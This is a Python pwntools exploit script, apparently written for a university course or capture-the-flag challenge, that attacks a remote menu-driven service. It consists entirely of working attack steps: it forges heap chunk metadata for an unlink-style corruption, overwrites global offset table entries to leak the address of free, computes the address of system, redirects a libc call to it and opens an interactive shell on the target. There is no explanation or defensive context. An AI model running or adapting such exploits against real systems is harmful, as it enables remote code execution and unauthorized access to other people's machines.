from pwn import *

r = 0x6020d8

p = remote("linux6.cs.nctu.edu.tw",11005)
#p = remote("127.0.0.1",3000)
p.recv()
raw_input("Wait")
p.send("2"+"\x00"*7)
p.send("128"+"\x00"*5)
p.send("a"+"\x00"*127)
p.send("2"+"\x00"*7)
p.send("128"+"\x00"*5)
p.send("a"+"\x00"*127)
p.send("2"+"\x00"*7)
p.send("128"+"\x00"*5)
p.send("a"+"\x00"*127)
p.send("4"+"\x00"*7)
p.send("0"+"\x00"*7)
p.send("2"+"\x00"*7)
p.send("128"+"\x00"*5)
p.send("a"+"\x00"*127)
p.send("3"+"\x00"*7)
p.send("0"+"\x00"*7)
p.send("288"+"\x00"*5)
p.send("X"*128)
p.send("X"*16)
p.send("\xa0"+"\x00"*7)
p.send("\x80"+"\x00"*7)
p.send(p64(r-0x18))
p.send(p64(r-0x10))
p.send("X"*0x60)
p.send("\x80"+"\x00"*7)
p.send("\x90"+"\x00"*7)
p.send("4"+"\x00"*7)
p.send("2"+"\x00"*7)
p.send("3"+"\x00"*7)
p.send("1"+"\x00"*7)
p.send("16"+"\x00"*6)
p.send("\x80"+"\x00"*7)
p.send(p64(0x602018))
sleep(1)
p.recv(timeout=10)
p.send("1"+"\x00"*7)
sleep(1)
s = p.recv(timeout=10)
print s[10:24]
for c in s[20:14:-1]:
	print hex(ord(c))
free_addr = u64(s[15:21]+"\x00\x00")
system_addr = free_addr - 0x3C7B0 
print hex(free_addr)
print hex(system_addr)
p.send("3"+"\x00"*7)
p.send("1"+"\x00"*7)
p.send("16"+"\x00"*6)
p.send("\x80"+"\x00"*7)
p.send(p64(0x602070))
p.send("3"+"\x00"*7)
p.send("0"+"\x00"*7)
p.send("8"+"\x00"*7)
p.send(p64(system_addr))

p.interactive()

